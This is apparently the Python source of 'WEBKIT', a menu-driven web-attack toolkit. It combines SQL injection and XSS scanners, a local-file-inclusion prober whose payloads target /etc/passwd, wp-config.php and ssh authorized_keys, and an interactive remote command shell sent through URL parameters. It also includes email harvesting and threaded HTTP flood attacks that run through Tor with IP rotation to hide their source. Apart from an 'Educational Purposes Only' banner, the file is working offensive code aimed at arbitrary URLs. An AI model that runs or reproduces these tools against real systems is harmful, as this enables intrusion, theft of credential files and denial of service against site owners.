from rgbprint import Color
from os import system, name
from fake_useragent import UserAgent
import requests, socket, re, time, threading
from urllib.parse import urljoin
from bs4 import BeautifulSoup as bs
from pprint import pprint
from bs4 import BeautifulSoup
from urllib.parse import urlencode
from stem import Signal
from stem.control import Controller

from src.done import attack_done
from src.countdown import countdown

w = Color.ghost_white
r = Color.red
g = Color.lime
b = Color.dodger_blue

wait = f"{b}[*]{w}"
error = f"{r}[!]{w}"
success = f"{g}[+]{w}"

ua = UserAgent()
user_agent = ua.random

s = requests.Session()
s.headers["User-Agent"] = f"{user_agent}"


with open('wordlists/endpoints.txt', 'r') as file:
    endpoints = file.read().splitlines()

################################################################################################################################################
#                                                              Change IP TOR                                                                   #
################################################################################################################################################

def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_password')
        controller.signal(Signal.NEWNYM)

def create_tor_session():
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    return session

session = create_tor_session()

parameters = [
    "template", "file", "path", "document", "shell", "page", "view", "include", "dir",
    "action", "module", "download", "content", "load", "style", "theme", "lang", "form",
    "layout", "type", "cmd", "exec", "execute", "run", "process", "step", "image", "img",
    "pic", "photo", "icon", "avatar", "thumb", "picture", "downloadfile", "arch", "video",
    "media", "play", "stream", "movie", "music", "song", "track", "id", "item", "category",
    "group", "folder", "dirpath", "filepath", "viewfile", "showfile", "loadfile", "config",
    "action", "load_module", "page_id", "content_id", "section", "chapter", "book", "article",
    "news", "product", "item_id", "doc", "resource", "doc_id", "file_id", "file_name", "name",
    "plugin", "layout", "output", "design", "engine", "plugin_name", "module_name", "component",
    "com", "section_id", "chapter_id", "section_name", "search", "report", "app", "system",
    "admin", "load_view", "show", "display", "part", "part_id", "form_id", "input", "load_input",
    "req", "req_id", "form", "form_name", "entry", "edit", "change", "update", "step", "next",
    "previous", "info", "details", "info_id", "id_doc", "view_item", "show_item", "preview",
    "thumb_id", "edit_id", "edit_item", "action_id", "op", "option", "option_id", "layout_id",
    "color", "theme_id", "template_id", "stylesheet", "lang_id", "language", "lang_code", "set",
    "config_id", "admin_path", "sys", "sys_path", "system_path", "tool", "task", "proc", "proc_id",
    "execute_id", "run_id", "command", "order", "query", "sql", "query_id", "search_term", "filter",
    "filter_id", "criteria", "command_id", "criteria_id", "sql_id", "category_id", "menu", "menu_id",
    "nav", "nav_id", "nav_item", "item_id", "download_id", "upload", "upload_id", "file_upload",
    "file_path", "dir_id", "file_load", "file_show", "media_id", "stream_id", "media_name", "video_id",
    "music_id", "audio_id", "play_id", "movie_id", "track_id", "song_id", "track", "audio", "video",
    "category_name", "group_id", "group_name", "user_id", "profile", "profile_id", "profile_pic",
    "avatar_id", "user_name", "account", "account_id", "customer", "client_id", "client", "employee_id",
    "staff_id", "staff", "person", "member_id", "project", "project_id", "project_name", "product_id",
    "order_id", "transaction_id", "purchase_id", "invoice_id", "contract_id", "agreement_id",
    "client_name", "user_info", "login", "auth", "auth_id", "auth_code", "password", "key", "token",
    "session", "session_id", "cookie", "cookie_id", "user_token", "api", "api_key", "apikey", "access",
    "access_token", "oauth", "oauth_token", "session_token", "session_key", "config_key", "secret",
    "jwt", "jwt_token", "authentication", "auth_token", "dashboard"
]

payloads = [
    "../../../../../etc/passwd",
    "/proc/version",
    "/var/www/html/wp-config.php",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/etc/php.ini",
    "/etc/httpd/conf/httpd.conf",
    "/var/www/html/maintenance.php",
    "/tmp/sess_abcd1234",
    "/home/user/.ssh/authorized_keys"
]


def get_all_forms(url):
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def is_vulnerable(response):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def scan_sql_injection(word):
    for c in "\"'":
        new_url = f"{word}{c}"
        print(f"{wait} ", new_url)
        res = s.get(new_url)
        if is_vulnerable(res):
            print(f"{success} SQL Injection vulnerability detected, link:", new_url)
            return
    forms = get_all_forms(word)
    print(f"{success} Detected {len(forms)} forms on {word}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{c}"
            url = urljoin(word, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(word, data=data)
            elif form_details["method"] == "get":
                res = s.get(word, params=data)
            if is_vulnerable(res):
                print(f"{success} SQL Injection vulnerability detected, link:", word)
                print(f"{wait} Form:")
                pprint(form_details)
                break

def get_all_forms2(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details2(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form2(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    print(f"{success} Submitting malicious payload to {target_url}")
    print(f"{success} Data: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_xss(url):
    forms = get_all_forms(url)
    print(f"{success} Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form2(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"{success} XSS Detected on {url}")
            print(f"{wait} Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable

def cmd():
    web = input(f'{w}URL {r}({b}example : http://example.com/run?cmd{r}) {g} >{w} ')
    print(web)
    while True:
        command = input(f'{g}remote{w} >{r} ')
        url = f'{web}={command}'
        resp = requests.get(url, timeout=10)
        print(resp.text)

def exploit_vulnerabilities(base_url, endpoints, command):
    for endpoint in endpoints:
        url = f"{base_url}{endpoint}={command}"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(f"{success} {url} {r}-{g} {response.text}{w}")
        except requests.RequestException as e:
            pass
    cmd()

def get_banner(url):
    try:
        response = requests.get(url)
        
        headers = response.headers

        for key, value in headers.items():
            print(f"{key}: {value}")
        
        server = headers.get('Server', 'Server header not found')
        powered_by = headers.get('X-Powered-By', 'X-Powered-By header not found')
        
        return {
            'Server': server,
            'X-Powered-By': powered_by
        }
    
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None

def check_paths(base_url, wordlist_file):
    with open(wordlist_file, 'r') as f:
        paths_to_check = [line.strip() for line in f.readlines() if line.strip()]

    for path in paths_to_check:
        url = urljoin(base_url, path)
        time.sleep(0.5)
        response = requests.get(url)
        if response.status_code == 200:
            print(f"{success} /{path} (Status : {response.status_code})")

def check_http_methods(url):
    methods_to_check = [
        'GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'CONNECT', 'TRACE'
    ]
    
    print(f"{wait} Checking HTTP methods for {url}:")
    for method in methods_to_check:
        try:
            response = requests.request(method, url)
            print(f"{success} {method} : {response.status_code}")
        except requests.RequestException as e:
            print(f"{error} {method} : {e}")

def email2(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            pattern = r'[\w\.-]+@[\w\.-]+'
            emails = set(re.findall(pattern, response.text))
            return list(emails)
        else:
            print(f"{error} Error {response.status_code} Requests")
    except requests.exceptions.RequestException as e:
        print(f"{error} ERROR: {e}")

def find_flag_in_robots(url):
    try:
        robots_url = url + "/robots.txt"
        response = requests.get(robots_url)
        if response.status_code == 200:
            robots_content = response.text
            flag = re.findall(r'THM\{.*?\}', robots_content)
            if flag:
                return flag[0]
    except Exception as e:
        print(f"{error} Error fetching robots.txt: {e}")
    return None

def find_flag_in_source(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            page_content = response.text
            flag = re.findall(r'THM\{.*?\}', page_content)
            if flag:
                return flag[0]
    except Exception as e:
        print(f"{error} Error fetching page source : {e}")
    return None

def main_robot(url):
    flag = find_flag_in_robots(url)
    if flag:
        print(f"{success} Flag found in robots.txt : {flag}")
    else:
        flag = find_flag_in_source(url)
        if flag:
            print(f"{success} Flag found in page source : {flag}")
        else:
            print(f"{error} Flag not found.")

def find_hidden_paths(base_url):
    robots_url = f"{base_url}/robots.txt"
    response = requests.get(robots_url)
    
    if response.status_code == 200:
        print(f"{wait} Analysing robots.txt from {robots_url}")
        lines = response.text.splitlines()
        
        disallowed_paths = []
        
        for line in lines:
            line = line.strip()
            if line.startswith("Disallow:"):
                path = line.split(":")[1].strip()
                disallowed_paths.append(path)

        for path in disallowed_paths:
            full_url = base_url + path
            check_response = requests.get(full_url)
            if check_response.status_code == 200:
                print(f"{success} Found accessible path: {full_url}")
            elif check_response.status_code == 403:
                print(f"{error} Path forbidden (403): {full_url}")
            elif check_response.status_code == 404:
                print(f"{error} Path not found (404): {full_url}")
            else:
                print(f"{error} Path returned status code {check_response.status_code}: {full_url}")
    else:
        print(f"{error} Couldn't access robots.txt at {robots_url}")

def LFI(url):
    for param in parameters:
        for payload in payloads:
            target_url = url + f"{param}={payload}"

            try:
                response = requests.get(target_url)

                if response.status_code == 200:
                   print(f"{success} {target_url}")
                   print(f'{b} {response.text[:200]}')
                   print('\n')
                elif response.status_code == 500:
                   print(f"{error} Server error with {param} and {payload} (code 500). This can be exploitable.")
            except requests.exceptions.RequestException as e:
                pass

def detect_os(host: str) -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((host, 80)) 
            
            request = f'GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n'
            sock.sendall(request.encode('utf-8'))

            response = sock.recv(1024).decode('utf-8')

            if 'Ubuntu' in response:
                return 'ubuntu'
            elif 'Debian' in response:
                return 'debian'
            elif 'Windows' in response:
                return 'windows'
            elif 'Apache' in response:
                return 'linux'
            elif 'nginx' in response:
                return 'linux'
            elif 'Python' in response:
                return 'python'
            elif 'Server' in response:
                return 'Unknown'
            else:
                return 'Unknown'

    except socket.error as e:
        return 'unknown'

def scan_port(host: str, port: int, timeout: float = 1.0) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            return result == 0
    except socket.error:
        return False

def bing_search(email):
    query = f'"{email}"'
    url = "https://www.bing.com/search"
    params = {
        'q': query
    }

    url_with_params = url + "?" + urlencode(params)
    
    try:
        headers = {
            'User-Agent': user_agent
        }
        response = requests.get(url_with_params, headers=headers)
        response.raise_for_status()  

        soup = BeautifulSoup(response.text, 'html.parser')

        links = []
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith('http'):
                links.append(href)
        
        return links
    
    except requests.RequestException as e:
        print(f"{error} Error during Bing search: {e}")
        return None

def check_email_in_page(url, email):
    try:
        headers = {
            'User-Agent': user_agent
        }
        response = requests.get(url, headers=headers)
        response.raise_for_status()  

        page_content = response.text.lower()
        return email.lower() in page_content

    except requests.RequestException as e:
        print(f"{error} Error during page check: {e}")
        return False
    




def get_flood(target_url, target_time):
    for _ in range(int(target_time)):
        try:
            headers = {
                'User-Agent': user_agent 
            }
            session.get(target_url, headers=headers)
            session.get(target_url, headers=headers)
        except requests.RequestException as e:
            pass

def start_get_flood(target_url, target_time):
    threads_list = []
    for _ in range(int(target_time)):
        thread = threading.Thread(target=get_flood, args=(target_url, target_time))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()
    attack_done()

def head_flood(target_url, target_time):
    for _ in range(int(target_time)):
        try:
            headers = {
                'User-Agent': user_agent 
            }
            session.head(target_url, headers=headers)
            session.head(target_url, headers=headers)
        except requests.RequestException as e:
            pass

def start_head_flood(target_url, target_time):
    threads_list = []
    for _ in range(int(target_time)):
        thread = threading.Thread(target=head_flood, args=(target_url, target_time))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()
    attack_done()

def post_flood(target_url, target_time):
    for _ in range(int(target_time)):
        try:
            headers = {
                'User-Agent': user_agent 
            }
            session.post(target_url, headers=headers)
            session.post(target_url, headers=headers)
        except requests.RequestException as e:
            pass

def start_post_flood(target_url, target_time):
    threads_list = []
    for _ in range(int(target_time)):
        thread = threading.Thread(target=post_flood, args=(target_url, target_time))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()
    attack_done()

################################################################################################################################################

title = f"""{w}
░░     ░░ ░░░░░░░ ░░░░░░  ░░   ░░ ░░ ░░░░░░░░ 
▒▒     ▒▒ ▒▒      ▒▒   ▒▒ ▒▒  ▒▒  ▒▒    ▒▒    
▒▒  ▒  ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒▒▒▒   ▒▒    ▒▒{r}
▓▓ ▓▓▓ ▓▓ ▓▓      ▓▓   ▓▓ ▓▓  ▓▓  ▓▓    ▓▓    
 ███ ███  ███████ ██████  ██   ██ ██    ██    

 •{w} Educational Purposes Only 
"""

help = """
 exploit    >>>   Exploit vulnerabilities 
 sql        >>>   SQL Injection Scanner
 xss        >>>   XSS Vulnerability Scanner 
 banner     >>>   Banner grabber
 suddomain  >>>   Subdomain Scanner
 admin      >>>   Admin Finder
 methods    >>>   Vulnerability Scanner for HTTP Methods 
 email      >>>   Email Recovery
 file       >>>   Show files 
 flag       >>>   See the hidden flags on the source code of the site or in robots.txt 
 robot      >>>   Identifying Hidden Directories Based on robots.txt
 lfi        >>>   Local File Inclusion
 os         >>>   OS detection
 dork       >>>   Search for information using an email
 get        >>>   GET Request Attack (TOR)
 head       >>>   HEAD Request Attack (TOR)
 post       >>>   POST Request Attack (TOR)
"""

################################################################################################################################################

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')
    
clear()
print(title)
def main():
    while True:
        command = input(f'{w}WEBKIT {g}><{w} ')

        if command == "cls" or command == "clea r":
           clear()
           print(title)
        elif command == "help" or command == "?":
           print(help)
        elif command == "exploit" or command == "EXPLOIT":
            base_url = input(f'{w}URL {r}({b}example : http://example.com{r}) {g} >{w} ')
            command = 'echo "Potential vulnerability detected!" '
            exploit_vulnerabilities(base_url, endpoints, command)
        elif command == "sql" or command == "SQL":
            url = input(f'{w}URL{g} >{w} ')
            scan_sql_injection(url)
        elif command == "xss" or command == "XSS":
            url = input(f'{w}URL{g} >{w} ')
            scan_xss(url)
        elif command == "banner" or command == "BANNER":
            url = input(f'{w}URL{g} >{w} ')
            banner_info = get_banner(url)
            print(f"{success} {banner_info}")
        elif command == "subdomain" or command == "SUBDOMAIN":
            base_url = input(f'{w}URL{g} >{w} ')
            wordlist_file = 'wordlists/subdomain.txt'
            check_paths(base_url, wordlist_file)
        elif command == "admin" or command == "ADMIN":
            url2 = input(f'{w}URL{g} >{w} ')
            wordlist = 'wordlists/admin.txt'
            check_paths(url2, wordlist) 
        elif command == "methods" or command == "METHODS":
            url = input(f'{w}URL{g} >{w} ')
            check_http_methods(url)
        elif command == "email" or command == "EMAIL":
            url = input(f'{w}URL{g} >{w} ')
            emails = email2(url)
            if emails:
                print(f"{success} Email addresses found on {url}:")
                for email in emails:
                    print(f'|{g} Found :{r} {email} {w}')
            else:
                print(f"{error} No email address found on : {url}.")
        elif command == "file" or command == "FILE":
            url = input(f'{w}URL{g} >{w} ')
            response = requests.get(url)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                links = soup.find_all('a') 
                for link in links:
                        href = link.get('href')
                        if href and not href.endswith('/'):
                            print(f'{success} {href}')
                        else:
                            print(f'{error} {href}')
        elif command == "flag" or command == "FLAG":
            site_url = input(f'{w}URL{g} >{w} ')
            main_robot(site_url)
        elif command == "robot" or command == "robot":
            url = input(f'{w}URL {r}({b}example : http://example.com{r}) {g} >{w} ')
            find_hidden_paths(url)
        elif command == "lfi" or command == "LFI":
            url = input(f'{w}URL {r}({b}example : http://example.com?{r}) {g} >{w} ')
            LFI(url)
        elif command == "os" or command == "OS":
            ip = input(f'{w}IP{g} >{w} ')
            os_name = detect_os(ip)
            print(f"{success} {os_name}/system")
        elif command == "dork" or command == "DORK":
            email = input(f'{w}EMAIL{g} >{w} ')
            search_results = bing_search(email)

            if search_results:
                for link in search_results:
                    if check_email_in_page(link, email):
                        print(f"{success} {link}")
                    else:
                       print(f"{error} {link}")
        elif command == "post" or command == "POST":
            target_url = input(f'{w}URL{g} >{w} ')
            target_time = int(input(f"{w}Time/s{g} >{w} "))
            countdown(1)
            renew_tor_ip()
            start_post_flood(target_url, target_time)
        elif command == "get" or command == "GET":
            target_url = input(f'{w}URL{g} >{w} ')
            target_time = int(input(f"{w}Time\s{g} >{w} "))
            countdown(1)
            renew_tor_ip()
            start_get_flood(target_url, target_time)
        elif command == "head" or command == "HEAD":
            target_url = input(f'{w}URL{g} >{w} ')
            target_time = int(input(f"{w}Time/s{g} >{w}  "))
            countdown(1)
            renew_tor_ip()
            start_head_flood(target_url, target_time)
        else:
           print(f"{error} Unknown command. type 'help' to see all commands.")  

if __name__ == '__main__':
    main()